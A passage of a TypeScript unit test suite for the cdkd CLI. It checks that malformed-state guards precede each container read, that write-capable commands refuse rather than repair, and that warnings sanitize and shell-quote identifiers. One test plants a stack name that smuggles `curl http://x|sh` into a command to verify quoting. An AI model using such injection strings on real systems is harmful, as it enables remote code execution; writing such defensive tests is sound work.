    ).toBeLessThan(branch.indexOf('if (options.fail)'));

    // The `outputs` half gets BOTH assertions too (review of
    // go-to-k/cdkd#3206). Its first cut asserted only that the identifier
    // appeared SOMEWHERE IN THE FILE, and the reviewer measured the cost:
    // splitting the throw so the outputs arm sat BELOW `if (options.fail)`
    // left 107 of 107 cases green while re-introducing #3018's round-1 defect
    // for the new container — `--dry-run --fail` over an unreadable outputs
    // bag exiting 1 through the SILENT ScrubNeededError, with the
    // audited-record message never printed.
    expect(
      branch,
      'the malformed-OUTPUTS finding is not raised inside the --dry-run branch, so it never ' +
        'runs: that branch returns.'
    ).toContain('malformedOutputRecords.length > 0');
    expect(
      branch,
      'the malformed-ORPHANS finding is not raised inside the --dry-run branch, so a ' +
        '--dry-run --fail run over an unreadable orphans container exits 1 through the SILENT ' +
        'ScrubNeededError instead of naming the container (go-to-k/cdkd#3379).'
    ).toContain('malformedOrphanRecords.length > 0');
    expect(
      branch.indexOf('malformedOrphanRecords.length > 0'),
      'the orphans finding is raised BELOW `options.fail`, so ScrubNeededError fires first.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));
    expect(
      branch.indexOf('malformedOutputRecords.length > 0'),
      'the outputs finding is raised BELOW `options.fail`, so ScrubNeededError (exit 1, silent) ' +
        'fires first and reports "scrub found a leak" for outputs scrub could not read.'
    ).toBeLessThan(branch.indexOf('if (options.fail)'));
  });
});

describe('the orphans container guard DOMINATES each reader (go-to-k/cdkd#3379)', () => {
  /**
   * Presence is not the property: the defect this container had was that every
   * reader reached it unguarded, and a guard written BELOW the first read
   * protects nothing. So each write-capable file is anchored on the expression
   * its guard must precede.
   *
   * `deploy-engine.ts` is anchored on its first SAVE rather than on a lexical
   * dereference, and that is the measured exception: `redactStateForPersist`
   * reads the container higher up the file than the guard, but is reachable
   * only from the save path below it. Anchoring it lexically would fence a
   * position the code never executes in that order.
   */
  const ANCHORS: Record<string, string> = {
    'src/deployment/deploy-engine.ts': 'await this.stateBackend.saveState(',
    'src/cli/commands/destroy-runner.ts': 'state.orphans ?? []',
    'src/cli/commands/rollback.ts': 'orphansAfterRollback(',
    'src/cli/commands/scrub.ts': 'state.orphans ?? []',
    'src/cli/commands/import.ts': 'orphansCarriedFrom(',
    'src/cli/commands/diff-recursive.ts': 'currentState.orphans?.length',
  };
  const SPELLINGS = [
    'refuseMalformedOrphans(',
    'refuseMalformedOrphansForDestroy(',
    'repairMalformedOrphansForReadOnly(',
    'hasReadableOrphans(',
  ];

  it.each(Object.keys(ANCHORS))('%s guards above its first container read', (file) => {
    const src = code(file);
    const positions = SPELLINGS.map((call) => src.indexOf(call)).filter((at) => at > -1);
    expect(
      positions.length,
      `${file} contains none of the guard spellings this fence knows about, so it would pass ` +
        `over nothing. Add the spelling to SPELLINGS, or this file stopped guarding.`
    ).toBeGreaterThan(0);
    const guardAt = Math.max(...positions);
    const anchor = ANCHORS[file]!;
    const anchorAt = src.indexOf(anchor);
    expect(
      anchorAt,
      `${file} no longer contains \`${anchor}\`; this fence's anchor is stale and it is no ` +
        `longer checking dominance.`
    ).toBeGreaterThan(-1);
    expect(
      guardAt,
      `${file} reaches \`${anchor}\` BEFORE its orphans guard, so the container is read, ` +
        `walked or written on a path the guard never covered (go-to-k/cdkd#3379).`
    ).toBeLessThan(anchorAt);
  });

  it('names every src file that reads the container, so a new reader cannot join unfenced', () => {
    // Derived from the tree, never from the list above: a file that starts
    // reading the container and is not anchored fails here. Read from
    // COMMENT-STRIPPED code — `orphan-adoption.ts` and `rollback-executor.ts`
    // name `StackState.orphans` in prose only, and `orphan-rewriter.ts` holds
    // an unrelated `this.orphans` field — so a prose mention cannot add a file
    // and, more importantly, cannot excuse one.
    const listed = spawnSync('git', ['grep', '-l', 'orphans', '--', 'src'], {
      cwd: repoRoot,
      encoding: 'utf8',
    })
      .stdout.split('\n')
      .filter(Boolean);
    expect(listed.length, 'the grep stopped matching; this fence is reading nothing').toBeGreaterThan(5);
    const readers = listed.filter((file) => {
      if (file === 'src/state/malformed-resources-bag.ts' || file === 'src/types/state.ts') return false;
      // `diff.ts` receives the already-repaired state from `loadStateOrEmpty`
      // rather than loading one, so its read is dominated by that file's guard.
      if (file === 'src/cli/commands/diff.ts') return false;
      return /[A-Za-z]*[Ss]tate\.orphans\b|orphansCarriedFrom\(|orphansAfterRollback\(/.test(code(file));
    });
    expect([...readers].sort()).toEqual(Object.keys(ANCHORS).sort());
  });

  it('pins the two exclusions the derivation above makes', () => {
    // `diff.ts` is excluded because it RECEIVES the repaired state rather than
    // loading one. The moment it loads state itself the exclusion is wrong, and
    // a comment cannot notice that.
    expect(
      code('src/cli/commands/diff.ts'),
      'diff.ts now loads state itself, so it owes its own guard rather than inheriting ' +
        "diff-recursive's repair."
    ).not.toContain('getState(');
    // `deploy-engine.ts` is anchored on its first SAVE because its only read
    // above the guard is `redactStateForPersist`, which is reachable only from
    // the save path. A second read landing above the guard would break that.
    const engine = code('src/deployment/deploy-engine.ts');
    const guardAt = engine.indexOf('refuseMalformedOrphans(');
    const above = engine.slice(0, guardAt).split(/[A-Za-z]*[Ss]tate\.orphans\b/).length - 1;
    expect(
      above,
      'deploy-engine.ts reads the container above its guard somewhere other than ' +
        'redactStateForPersist, so the save anchor no longer covers every read.'
    ).toBe(1);
  });
});

describe('isReadableBag is the ONE predicate (issue go-to-k/cdkd#3187)', () => {
  /**
   * Every shape, with the verdict written as a LITERAL rather than taken from
   * the sibling predicate.
   *
   * `hasReadableResources` delegates, so comparing the two is true by
   * construction and reds on nothing inside `isReadableBag` (measured: mutating
   * it to `return true` reds 14 cases in this file, none of them the comparison
   * — review of go-to-k/cdkd#3190). The literals are the coverage; the
   * comparison below is drift-detection for the day someone RE-INLINES the body
   * into `hasReadableResources`, which is the only way the two can disagree.
   */
  const READABLE: ReadonlyArray<readonly [string, unknown, boolean]> = [
    // DERIVED from the shared table, not re-spelled beside it: a shape added
    // there must be covered here too, and a hand-written copy silently would
    // not be (review of go-to-k/cdkd#3190). The verdicts stay literals — that
    // is the half that must not be computed.
    ...UNREADABLE.map(([label, value]) => [label, value, false] as const),
    ['a boolean', true, false],
    ['an empty object', {}, true],
    ['a populated object', { A: 1 }, true],
  ];

  it('answers the plain-object question for every shape', () => {
    for (const [label, value, expected] of READABLE) {
      expect(isReadableBag(value), label).toBe(expected);
    }
  });

  it('and hasReadableResources still delegates to it, so the two cannot drift', () => {
    for (const [label, value] of READABLE) {
      expect(hasReadableResources(state(value)), label).toBe(isReadableBag(value));
    }
  });
});

describe('the rendered-container warning (issue go-to-k/cdkd#3187)', () => {
  const CONTAINERS: readonly RenderedStateContainer[] = [
    'outputs',
    'skippedOutputs',
    'attributes',
    'properties',
  ];

  it('renders both identifiers exactly as its sibling messages do, and ends on the command', () => {
    // A planted stack name that would close the quoting and append its own
    // command to the line this text tells the user to RUN. A stack name reaches
    // these paths from an S3 key, so it is not trusted.
    const evil = "a'; curl http://x|sh; echo '";
    const w = malformedRenderedContainersWarning(evil, 'us-east-1', ['outputs']);
    const sibling = malformedResourcesWarning(evil, 'us-east-1');

    // The command is LAST and UNWRAPPED here — an outer `'...'` would compose
    // with `shellQuote`'s own quoting into something unpastable.
    //
    // `command.endsWith('--json')` is the whole LAST assertion. An
    // `expect(w.endsWith(command))` beside it would be a tautology, since
    // `command` is a suffix of `w` by construction, and it read as a second
    // check (review of go-to-k/cdkd#3190). This one reds on any prose appended
    // after the command.
    const start = w.indexOf('cdkd state show ');
    expect(start).toBeGreaterThan(-1);
    const command = w.slice(start);
    expect(command.endsWith('--json')).toBe(true);

    // ...and BYTE-IDENTICAL to the command the sibling message builds from the
    // same inputs. That is the assertion that cannot rot: it pins the shared
    // sanitize-then-shell-quote path rather than re-spelling `shellQuote`'s
    // output here, where a hand-written expectation would have to be revised —
    // and could be revised WRONG — every time that helper changes.
    expect(sibling).toContain(command);
    // The planted text never appears unquoted.
    expect(command).not.toContain(`show ${evil} `);
  });

  it('keeps a control-bearing identifier on ONE line, so it cannot forge a row', () => {
    const w = malformedRenderedContainersWarning(
      `Evil${String.fromCharCode(0x1b)}[31m\nStack: Decoy`,
      'us-east-1',
      ['outputs']
    );
    expect(w.split('\n')).toHaveLength(1);
    expect(w).not.toContain(String.fromCharCode(0x1b));
  });

  it('renders an identifier that sanitizes to EMPTY as a placeholder', () => {
    // Never as nothing: an empty argument makes `--stack-region` swallow the
    // next flag, turning the remedy into a differently-broken command.
    //
    // Built from escapes rather than written as literal bytes: a raw control
    // character makes `grep` and `rg` treat the whole file as BINARY and skip
    // it, so every grep-based audit stops seeing this suite. Enforced by
    // `tests/unit/scripts/source-control-bytes.test.ts`, which is what caught
    // the first cut of this case.
    const controlOnly = String.fromCharCode(0x00, 0x01);
    const w = malformedRenderedContainersWarning(controlOnly, 'us-east-1', ['outputs']);
    expect(w).toContain(UNRENDERABLE);
  });

  it('names the containers in the order it was given, quoted', () => {
    const w = malformedRenderedContainersWarning('S', 'us-east-1', CONTAINERS);
    expect(w).toContain(`'outputs', 'skippedOutputs', 'attributes', 'properties'`);
  });

  it('sanitizes a container NAME too, so the closed union is not the only guard', () => {
    // The union is closed at COMPILE time and the sole caller sources its names
    // from a module constant, so nothing can reach this today. That is exactly
    // why it is worth a case: the guarantee would otherwise live in a comment,
    // and the day a caller derives a name from a record the forged element
    // would render verbatim and could forge a line. Cast, because the type is
    // what this case is deliberately reaching around.
    const forged = `x\nStack: Decoy` as RenderedStateContainer;
    const w = malformedRenderedContainersWarning('S', 'us-east-1', [forged]);
    expect(w.split('\n')).toHaveLength(1);
    // The RENDERED token, not just the line count: a sanitizer that returned
    // `''` for everything would satisfy a line-count assertion while naming no
    // container at all (review of go-to-k/cdkd#3190). The newline becomes a
    // space, so the text survives as prose inside its quotes and cannot start a
    // row.
    expect(w).toContain(`'x Stack: Decoy'`);
  });

  it('floors a name that sanitizes to EMPTY and caps a multi-kilobyte one', () => {
    // The two classes `safeIdentifier` closes that a bare sanitizer does not,
    // and the reason the names take that helper rather than `displaySafe`
    // alone: `''` names no container, and an uncapped name pushes the remedy
    // command off the reader's screen. Same casts, same unreachable-today path.
    const empty = malformedRenderedContainersWarning('S', 'us-east-1', [
      String.fromCharCode(0x00, 0x01) as RenderedStateContainer,
    ]);
    expect(empty).toContain(`'${UNRENDERABLE}'`);

    const long = malformedRenderedContainersWarning('S', 'us-east-1', [
      'q'.repeat(5000) as RenderedStateContainer,
    ]);
    expect(long).toContain(`'${'q'.repeat(128)}...'`);
    // The remedy is still on SCREEN after the cap — a DISTANCE, not
    // `endsWith('--json')`, which the template satisfies on every path with or
    // without a cap and would be the tautology this suite just deleted one case
    // over (review of go-to-k/cdkd#3190). Uncapped, the 5000-character name
    // alone pushes the message past this bound.
    expect(long.length).toBeLessThan(1000);
  });
});

/**
 * WHICH helper each call site gets is the whole safety property, and the first
 * round of go-to-k/cdkd#3018 got it wrong in the dangerous direction: it
 * REPAIRED on `cdkd scrub`, whose `saveState` is gated on `recordsChanged > 0`
 * — satisfied by an OUTPUTS change alone — so a record holding
 * `"resources": null` plus a plaintext secret in `outputs` would have been
 * scrubbed and then saved back with a well-formed `resources: {}`. That
 * launders the only signal anything is wrong: the next `cdkd deploy` reads
 * zero resources and re-CREATES the stack, and the next `cdkd destroy` orphans
 * every live resource.
 *
 * So the rule is mechanical — a command that can WRITE state refuses; only a
 * read-only one repairs — and these cases pin each site to the right side of
 * it.
 */
describe('write-capable commands refuse; read-only ones repair', () => {
  const REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
    // Added in round 3: `{...null}` yields `{}` and throws nothing, so this
    // one launders silently — in the command that runs precisely when state is
    // already suspect.
    'src/cli/commands/rollback.ts',
    // Added by go-to-k/cdkd#3161. Each refuses through its OWN entry point
    // carrying its own TEXT, because neither does what
    // `malformedStateRefusalMessage` describes: `destroy-runner.ts` DELETES the
    // record down an empty-stack fast path rather than saving over it, and
    // `deploy-engine.ts` re-provisions the whole stack before the save the
    // shared text names. Both delegate to `hasReadableResources`, so the
    // VERDICT stays singular while the message varies — the same shape the
    // `outputs` half took under go-to-k/cdkd#3207.
    'src/deployment/deploy-engine.ts',
    'src/cli/commands/destroy-runner.ts',
  ];
  // A THIRD write-capable reader exists and is deliberately NOT in that list:
  // `src/provisioning/providers/nested-stack-provider.ts` calls no `saveState`
  // of its own, which is the PREMISE the loop above asserts — so it gets its
  // own case below, exactly as the `outputs` half already gives it one. An
  // earlier revision of the comment above called the two entries "the LAST two
  // write-capable readers", which this file contradicts (review round 2 of
  // go-to-k/cdkd#3332).
  const REPAIR = ['src/cli/commands/diff-recursive.ts'];

  /**
   * Every helper in this module that REFUSES on the `resources` container.
   *
   * Derived by grep rather than by recall:
   *   grep -n "^export function refuseMalformed" \
   *     src/state/malformed-resources-bag.ts
   * then subtracting the `Outputs`, `ResourceProperties` and `ResourceEntries`
   * families, which the partition case below re-derives so another cannot be
   * added unnoticed.
   */
  const RESOURCES_REFUSAL_SPELLINGS = [
    'refuseMalformedState(',
    'refuseMalformedResourcesForDestroy(',
    'refuseMalformedResourcesForDeploy(',
  ];

  /**
   * The module's refusal entry points partition into exactly five classes: the
   * `outputs`, `properties`, `resources` and `orphans` containers, and the
   * ENTRY guard.
   *
   * A UNION count alone would stay green through a RE-CLASSIFICATION — an
   * `outputs` refusal renamed into the `resources` family keeps the total
   * unmoved — so each partition is asserted separately, and the leftover set is
   * asserted EMPTY so a helper belonging to none of them fails here instead of
   * silently escaping every dominance loop in this file.
   */
  it('every refusal the module exports is classified into exactly one class', () => {
    const moduleSrc = code('src/state/malformed-resources-bag.ts');
    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
      (m) => `${m[1]!}(`
    );
    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(11);

    const outputs = exported.filter((n) => /Outputs\(|Outputs[A-Z]/.test(n));
    const properties = exported.filter((n) => n.includes('ResourceProperties'));
    // The ENTRY guard (go-to-k/cdkd#3018) is its own class: opt-in per flow, and
    // not a `resources` BAG refusal, so a dominance check keyed on the bag's
    // spellings must not treat it as one.
    const entries = exported.filter((n) => n.includes('ResourceEntries'));
    expect(entries).toEqual(['refuseMalformedResourceEntries(']);
    // The `orphans` CONTAINER (go-to-k/cdkd#3379), its own class for the reason
    // the entry guard is: it is not a `resources` bag refusal, so a dominance
    // check keyed on the bag's spellings must not count it as one.
    // TWO entry points on this container, one predicate — the split is the
    // MESSAGE, as it is for `outputs`: a destroy writes nothing back, so its
    // text cannot be the one that says the container would be rewritten.
    const orphans = exported.filter((n) => n.includes('Orphans'));
    expect([...orphans].sort()).toEqual([
      'refuseMalformedOrphans(',
      'refuseMalformedOrphansForDestroy(',
    ]);
    const resources = exported.filter(
      (n) =>
        !outputs.includes(n) && !properties.includes(n) && !entries.includes(n) && !orphans.includes(n)
    );
    // Derived from REFUSAL_SPELLINGS rather than re-spelled: a second hard-coded
    // copy of that triple is what drifts when a fourth outputs refusal lands.
    expect(outputs.sort()).toEqual([...REFUSAL_SPELLINGS].sort());
    // TWO entry points on this container since go-to-k/cdkd#3318, one
    // predicate: `cdkd deploy` refuses through the first and `cdkd orphan`
    // through the second, for the message and the SCOPE rather than for the
    // verdict — both read `unreadableResourcePropertyBags`, the orphan one
    // subtracting the records its save is deleting.
    expect([...properties].sort()).toEqual([
      'refuseMalformedResourceProperties(',
      'refuseMalformedResourcePropertiesForOrphan(',
    ]);
    expect(
      [...resources].sort(),
      'a `resources` refusal exists that RESOURCES_REFUSAL_SPELLINGS does not name, so every ' +
        'dominance check below would pass over nothing for a file refusing through it.'
    ).toEqual([...RESOURCES_REFUSAL_SPELLINGS].sort());
  });

  /**
   * The premise of a sentence in `malformedDestroyResourcesRefusalMessage`:
   * it tells an operator who wants the record gone to run `cdkd state orphan`,
   * which is what answers go-to-k/cdkd#3161's objection to refusing a cleanup
   * command at all. That advice is only true while `state orphan` does not
   * itself read the bag it is being pointed at.
   */
  it('cdkd state orphan reads no resources bag, so the destroy refusal may point at it', () => {
    const src = code('src/cli/commands/state.ts');
    const at = src.indexOf('async function stateOrphanCommand');
    expect(at, 'stateOrphanCommand was renamed; this fence is reading nothing').toBeGreaterThan(-1);
    // Bounded to that function's own body: `state.ts` hosts every `cdkd state`
    // subcommand, so a whole-file scan would be answered by `state resources`.
    const body = src.slice(at, src.indexOf('\nfunction ', at + 1));
    expect(
      body.includes('.resources'),
      'cdkd state orphan now reads the resources bag, so the destroy refusal must stop naming ' +
        'it as the supported way to drop a record whose bag is unreadable.'
    ).toBe(false);
  });

  /**
   * The FIRST expression in each file that READS the resources bag. The
   * refusal has to come before it.
   *
   * For `import` / `orphan` / `rollback` the anchor is an UNGUARDED read, so
   * a refusal below it leaves the raw TypeError in front of the named one --
   * round 1's exact defect. `scrub`'s anchor carries a `?? {}` and so cannot
   * throw; it is pinned anyway because a refusal below the point the bag is
   * first CONSUMED would let the command act on an empty map before deciding
   * it will not act at all.
   */
  const FIRST_DEREF: Record<string, string> = {
    'src/cli/commands/scrub.ts': 'Object.entries(state.resources',
    'src/cli/commands/import.ts': 'hasOwnProperty.call(existingState.resources',
    'src/cli/commands/orphan.ts': 'id in state.resources',
    'src/cli/commands/rollback.ts': '{ ...baseState.resources }',
    // go-to-k/cdkd#3161. Each anchor is the LOADED record's bag, which is what
    // the guard is about.
    //
    // `deploy-engine.ts`'s is the debug line that reports the resource count —
    // the first read of `currentState`, and the one that raised the bare
    // `TypeError` on a `null` bag. `currentState` is local to `deploy()`, so no
    // earlier occurrence of this spelling exists to make the bound vacuous.
    'src/deployment/deploy-engine.ts': 'Object.keys(currentState.resources).length',
    // `destroy-runner.ts`'s is the COUNT the whole defect turns on: the
    // empty-stack fast path that deletes `state.json` sits immediately below
    // it, so a guard anywhere under this line refuses a record it has already
    // removed. Deliberately NOT `countProtectedResources`'s
    // `Object.values(state.resources ?? {})`, which is textually earlier: that
    // is an exported helper reading whatever bag it is HANDED, the same
    // relationship the outputs half records for `redactStateForPersist`, and
    // the runner calls it far below this point.
    'src/cli/commands/destroy-runner.ts': 'Object.keys(state.resources).length',
  };

  for (const file of REFUSE) {
    it(`${file} REFUSES — it can saveState`, () => {
      const src = code(file);
      // TWO spellings count as refusing. Most files call the shared helper;
      // `scrub` branches on the exported predicate and raises its OWN exit-2
      // class, because its exit 1 is spoken for ("--fail found plaintext").
      // Both must carry the same MESSAGE, which the exit-code case pins.
      const refuses =
        RESOURCES_REFUSAL_SPELLINGS.some((call) => src.includes(call)) ||
        (src.includes('hasReadableResources(') && src.includes('malformedStateRefusalMessage('));
      expect(
        refuses,
        `${file} calls saveState, so a malformed record must be refused, not repaired: saving ` +
          `over it would replace the evidence with a well-formed empty bag permanently. Call ` +
          `refuseMalformedState(), or branch on hasReadableResources() and raise your own ` +
          `class around malformedStateRefusalMessage().`
      ).toBe(true);
      // `scrub` is the one file legitimately holding BOTH: its write gate is
      // `recordsChanged > 0 && !opts.dryRun`, so under `--dry-run` it provably
      // cannot persist and repairing preserves the audit. Any OTHER
      // write-capable file holding the repair helper is the round-2 defect.
      if (file !== 'src/cli/commands/scrub.ts') {
        expect(
          src.includes('repairMalformedResourcesForReadOnly'),
          `${file} repairs a malformed resources bag but can also WRITE state.`
        ).toBe(false);
      } else {
        // NOT `toContain('!opts.dryRun')`: the doc comment beside the branch
        // quotes that gate verbatim, so the assertion passed on the PROSE —
        // delete the runtime gate, keep the comment, fence stays green. Pin
        // the two things that actually make the exception sound, each as a
        // statement rather than as explanation: the lock is not taken under
        // --dry-run, and the save is gated on it.
        expect(src, 'scrub no longer skips the lock under --dry-run').toMatch(
          /acquired\s*=\s*!opts\.dryRun/
        );
        expect(src, "scrub's saveState is no longer gated on !opts.dryRun").toMatch(
          /recordsChanged > 0 && !opts\.dryRun/
        );
        // And the repair must not be able to end in a clean verdict — the
        // finding has to reach a non-zero exit (go-to-k/cdkd#3018 round 4).
        expect(
          src,
          'a --dry-run that repaired a malformed bag no longer raises; `--dry-run --fail` would ' +
            'report a CI-green clean run over a record whose resources it never read.'
        ).toContain('malformedRecords.length > 0');
      }
      // The premise of the rule, asserted rather than assumed — if this file
      // stops writing state the classification should be revisited, not
      // silently inherited.
      expect(src, `${file} no longer calls saveState`).toContain('saveState(');

      // DOMINANCE, not presence. The round-1 defect WAS a position error -- a
      // guard below the dereference it meant to protect -- so a fence that
      // only checks the refusal exists would not have caught it, and moving
      // any of these calls below its file's first bag dereference reds
      // nothing without this.
      // The LAST of the per-spelling FIRST occurrences (`Math.max` over
      // `indexOf`), which is stricter than any one of them: a file refusing
      // through two spellings must have BOTH above its first dereference.
      // Every spelling ends in `(`, which an `import` clause cannot contain, so the `import` line at
      // the top of the file is not a candidate and no import-stripping pass is
      // needed — a round of this fence added one and it changed not a single
      // index on any file here (measured, review of go-to-k/cdkd#3161).
      //
      // Taken over the spellings actually present, and THAT is the half that
      // was vacuous: `indexOf` answers `-1` for an absent one, `-1` is less
      // than every dereference index, so a fence reading a FIXED pair passed
      // over nothing on a file refusing through a third spelling — and
      // go-to-k/cdkd#3161 added two such files.
      const positions = [...RESOURCES_REFUSAL_SPELLINGS, 'hasReadableResources(']
        .map((call) => src.indexOf(call))
        .filter((at) => at > -1);
      expect(
        positions.length,
        `${file} contains none of the refusal spellings this fence knows about, so its ` +
          `dominance check would pass over nothing. Add the spelling to ` +
          `RESOURCES_REFUSAL_SPELLINGS.`
      ).toBeGreaterThan(0);
      const refusalAt = Math.max(...positions);
      const derefAt = FIRST_DEREF[file]!;
      const derefIndex = src.indexOf(derefAt);
      expect(
        derefIndex,
        `${file} no longer contains its first bag dereference \`${derefAt}\`; this fence's ` +
          `anchor is stale and it is no longer checking dominance.`
      ).toBeGreaterThan(-1);
      expect(
        refusalAt,
        `${file} refuses AFTER its first \`state.resources\` dereference (\`${derefAt}\`), so ` +
          `the raw TypeError still fires one line above the refusal — the exact shape ` +
          `go-to-k/cdkd#3018's first cut shipped.`
      ).toBeLessThan(derefIndex);
    });
  }

  // `diff-recursive.ts` hands the repaired record to `diff.ts`, which is where
  // the top-level command lives. The repair is only safe while NEITHER writes,
  // so the consumer is fenced alongside the producer rather than reasoned about.
  it('src/cli/commands/diff.ts consumes a repaired record and must not write either', () => {
    const src = code('src/cli/commands/diff.ts');
    // A write would arrive through a helper, not necessarily through a literal
    // `saveState(` in this file — so the three helpers that own one are fenced
    // by IMPORT as well.
    for (const writer of ['ExportIndexStore', 'LockManager', 'DeploymentEventsStore']) {
      expect(
        src.includes(writer),
        `src/cli/commands/diff.ts now imports ${writer}, which can persist. It consumes ` +
          `records repaired by diff-recursive.ts, so any write from this file can launder a ` +
          `merely-unreadable record into a well-formed empty one.`
      ).toBe(false);
    }
    expect(
      src.includes('saveState('),
      `src/cli/commands/diff.ts now writes state. It receives records repaired by ` +
        `diff-recursive.ts's loadStateOrEmpty, so writing one back would save a well-formed ` +
        `empty bag over a merely-unreadable record — the laundering go-to-k/cdkd#3018's fix ` +
        `refuses everywhere else.`
    ).toBe(false);
  });

  for (const file of REPAIR) {
    it(`${file} REPAIRS — it never writes`, () => {
      const src = code(file);
      expect(src).toContain('repairMalformedResourcesForReadOnly(');
      expect(src).toContain('malformedResourcesWarning(');
      // BOTH halves, since go-to-k/cdkd#3018. The bag repair alone left this
      // file dereferencing a null ENTRY in its two nested-child walks, and the
      // sweep that produced the residual list could not see it: a file that
      // IMPORTS this module reads as remedied whether or not it took the half
      // that applies to it.
      expect(
        src.includes('repairMalformedResourceEntriesForReadOnly('),
        `${file} repairs the BAG but not its ENTRIES; hasReadableResources tests the bag, so ` +
          `{"resources": {"R": null}} survives that repair and throws at the first entry read.`
      ).toBe(true);
      expect(src).toContain('malformedResourceEntriesWarning(');
      expect(
        src.includes('saveState('),
        `${file} now writes state, so repairing a malformed bag there can launder the record ` +
          `— it must refuse instead.`
      ).toBe(false);
    });
  }

  /**
   * The THIRD write-capable reader of the `resources` bag
   * (go-to-k/cdkd#3161), and the one that writes no state ITSELF — so the loop
   * above cannot hold it: its premise assertion is exactly `saveState(`.
   *
   * `NestedStackProvider.delete` counts the CHILD's bag to log
   * `N resource(s)` and only THEN hands the record to `runDestroyForStack`, so
   * the runner's own guard — however well placed inside it — could not see a
   * `null` or absent child bag; the bare `TypeError` fired one call earlier.
   * Same relationship, and same fence shape, as the `outputs` half already
   * records for this file.
   */
  it('src/provisioning/providers/nested-stack-provider.ts REFUSES a malformed CHILD resources bag', () => {
    const file = 'src/provisioning/providers/nested-stack-provider.ts';
    const src = code(file);
    // The premise. If it ever writes state directly it belongs in REFUSE.
    expect(
      src.includes('saveState('),
      `${file} now writes state directly; move it into REFUSE.`
    ).toBe(false);
    expect(
      src.includes('refuseMalformedResourcesForDestroy('),
      `${file} counts the CHILD's resources bag before handing the record to the destroy ` +
        `runner, so a null or absent child bag dies on a bare TypeError one call above the ` +
        `runner's own guard.`
    ).toBe(true);
    expect(
      src.includes('repairMalformedResourcesForReadOnly'),
      `${file} repairs the child's bag, which reports a damaged child as an EMPTY stack to the ` +
        `destroy that follows.`
    ).toBe(false);
    // DOMINANCE against the first read of the child's bag, and against the
    // hand-off itself — a guard below either is useless.
    const derefAt = 'Object.keys(childStateData.state.resources).length';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
    ).toBeGreaterThan(-1);
    const refusalAt = src.indexOf('refuseMalformedResourcesForDestroy(childStateData.state');
    expect(
      refusalAt,
      `${file} refuses AFTER counting the child's bag, so the count this guard exists to ` +
        `precede has already run.`
    ).toBeGreaterThan(-1);
    expect(refusalAt).toBeLessThan(derefIndex);
    const handoffAt = src.indexOf('runDestroyForStack(childStackName');
    expect(handoffAt, `${file} no longer hands the child record to the runner.`).toBeGreaterThan(-1);
    expect(
      refusalAt,
      `${file} refuses AFTER entering the child destroy.`
    ).toBeLessThan(handoffAt);
  });

  /**
   * The `outputs` half (go-to-k/cdkd#3189). Same DOMINANCE shape as the refusal
   * cases above, for the same measured reason: the harm is a guard sitting
   * BELOW the first dereference of the container it guards, and a fence that
   * only checks the call exists stays green through exactly that move.
   */
  it('src/cli/commands/diff-recursive.ts repairs `outputs` BEFORE anything reads it', () => {
    const file = 'src/cli/commands/diff-recursive.ts';
    const src = code(file);
    expect(
      src.includes('repairMalformedOutputsForReadOnly('),
      `${file} no longer repairs a malformed 'outputs' bag at the load, so a hand-edited ` +
        `record whose outputs hold a string previews one phantom REMOVE row per character.`
    ).toBe(true);
    expect(
      src.includes('malformedOutputsWarning('),
      `${file} repairs the 'outputs' bag silently. An empty bag is indistinguishable from a ` +
        `record that exports nothing, so every output reads as an ADD with no sign the record ` +
        `is damaged.`
    ).toBe(true);

    // The first thing in this file that READS the stored bag. It is a LOOKUP,
    // not the walk that fabricates: `resolveTemplateOutputs` receives
    // `currentState.outputs` and asks `hasOwnProperty.call(storedOutputs, key)`
    // of it, which ANSWERS TRUE on a string for `'0'` / `'length'` and THROWS
    // on `null`. A repair below this line leaves both.
    const derefAt = 'currentState.outputs';
    const derefIndex = src.indexOf(derefAt);
    expect(
      derefIndex,
      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale and it is no ` +
        `longer checking dominance.`
    ).toBeGreaterThan(-1);
    expect(
      src.indexOf('repairMalformedOutputsForReadOnly('),
      `${file} repairs the 'outputs' bag AFTER its first \`${derefAt}\` read, so the stored-key ` +
        `lookups still run against the unrepaired container — the shape go-to-k/cdkd#3018's ` +
        `first cut shipped for the resources bag.`
    ).toBeLessThan(derefIndex);
  });

  /**
   * The `outputs` bag's WRITE-capable half (go-to-k/cdkd#3192) — the same
   * enumeration the `resources` cases above carry, so a new site cannot be
   * added on the wrong side of the refuse-versus-repair rule for one container
   * while satisfying it for the other.
   *
   * The population is the write-capable files that READ or REBUILD the bag,
   * which is NOT the same set as `REFUSE` above. `rollback.ts` is the
   * difference and is excluded deliberately: `grep -n outputs
   * src/cli/commands/rollback.ts` returns NOTHING — it spreads `...baseState`,
   * carrying the field by value — so a guard there would protect nothing, and
   * an unfalsifiable guard fences nothing. The membership case below pins that
   * premise rather than leaving it in a comment.
   */
  /**
   * Every helper in this module that REFUSES on the `outputs` container.
   *
   * A list rather than a fixed pair because go-to-k/cdkd#3207 gave two sites
   * their own TEXT (a destroy clears the bag rather than rebuilding it; a
   * nested child's damage is written into the PARENT's record), and each text
   * needs its own throwing entry point. What they share is
   * `hasReadableOutputs`, so the VERDICT stays singular.
   *
   * Derived by grep rather than by recall:
   *   grep -n "^export function refuseMalformed.*Outputs" \
   *     src/state/malformed-resources-bag.ts
   */
  const REFUSAL_SPELLINGS = [
    'refuseMalformedOutputs(',
    'refuseMalformedOutputsForDestroy(',
    'refuseMalformedNestedChildOutputs(',
  ];

  it('REFUSAL_SPELLINGS names every outputs refusal the module exports', () => {
    // A fence listing spellings goes inert the moment a sixth is added and not
    // listed — the population is derived from the MODULE, never from this list.
    const moduleSrc = code('src/state/malformed-resources-bag.ts');
    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*Outputs\w*)\(/g)]
      .map((m) => `${m[1]!}(`)
      .sort();
    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(3);
    expect([...REFUSAL_SPELLINGS].sort()).toEqual(exported);
  });

  const OUTPUTS_REFUSE = [
    'src/cli/commands/scrub.ts',
    'src/cli/commands/import.ts',
    'src/cli/commands/orphan.ts',
    // Added by go-to-k/cdkd#3207. Both call `saveState` — `deploy` writes the
    // rebuilt bag on the no-change path and carries it verbatim on five
    // failure-path saves; `destroy-runner` writes a trimmed record and
